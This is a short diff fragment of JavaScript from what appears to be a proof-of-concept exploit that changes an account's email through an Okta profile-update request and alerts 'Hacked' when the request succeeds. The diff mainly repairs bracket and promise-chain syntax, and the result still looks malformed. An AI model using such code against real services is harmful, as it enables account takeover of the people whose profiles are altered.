@@ -33,11 +33,11 @@ async function s2() {
             "login": email,
             "newEmail":email
         }
-    }).then(t=>t.json())
+    })}).then(t=>t.json());
     if (r && r.data && r.data.updateProfileOkta && r.data.updateProfileOkta.status == 'Success') {
     alert('Hacked');
 } else {
       alert('Error:' + JSON.stringify(r))
 }
-}).then(t=>t.json())
+
 }
